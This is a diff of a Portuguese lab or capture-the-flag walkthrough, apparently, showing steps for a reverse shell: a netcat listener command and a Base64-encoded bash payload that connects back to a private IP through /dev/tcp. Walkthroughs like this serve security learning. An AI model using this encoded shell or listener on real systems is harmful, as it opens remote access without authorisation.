@@ -48,7 +48,6 @@ Com isso já podemos pensar em nosso *Reverse-Shell*.
 1 - Primeiramente costumo abrir o Burp. 
 2 - Logo em seguida, tive ajuda de um site para nós ajudarmos a montar nosso *Reverse-Shell* -- https://www.revshells.com/
 3 - Abrir uma porta de escuta na máquina local: nc -nlvp 1113
-
 ```
 Com o Reverse-Shell montado precisamos codificá-lo em *Base64*: https://www.base64encode.org/
 `L2Jpbi9iYXNoIC1jICdzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEuMjAzLzExMTMgMD4mMSc=`
